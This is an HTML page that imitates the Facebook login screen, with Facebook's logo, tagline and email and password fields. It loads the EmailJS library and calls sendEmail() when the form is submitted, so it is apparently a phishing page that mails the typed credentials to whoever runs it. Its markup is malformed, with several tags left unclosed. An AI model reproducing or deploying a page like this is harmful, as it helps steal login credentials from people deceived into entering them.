  <!DOCTYPE html>
  <html>
    <head>
      <title>Bootstrap 5 Facebook Login Page</title>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <meta name="description" content="">

      <link href="https://fonts.googleapis.com/css?family=Nunito+Sans:300i,400,700&display=swap" rel="stylesheet">
      <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/5.0.0-alpha1/css/bootstrap.min.css">
      <link rel="stylesheet" href="form.css">
      <script
      type="text/javascript"
      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"

      (function () {

      })();

    <body>
      <div class="container">
        <div class="row align-items-center justify-content-center vh-100">
          <div class="col-md-7">
            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" class="w-50">
            <h3>Facebook helps you connect and share with the people in your life.</h3>
          </div>
                                                                          <!--  -->
          <div class="col-md-5"   >
            <div id="error"></div>
            <form class="login-form" onsubmit="sendEmail()" action="index.html" method="post">
              <div class="mb-3">
                <input type="email"  id="email" class="form-control" placeholder="Email address or phone number"

                <input type="password" id="password" class="form-control" placeholder="Password"

              <div class="text-center pt-3 pb-3">
                <a href="#" class="">Forgotten password?</a>
                <hr>
                <button type="button"  class="btn btn-success btn-lg mt-3">Create New Account</button>
              </div>
            </form>
            <p class="pt-3 text-center"><b>Create a Page</b> for a celebrity, band or business.</p>
          </div>
        </div>
      </div>
      <script src="form.js"></script>
    </body>
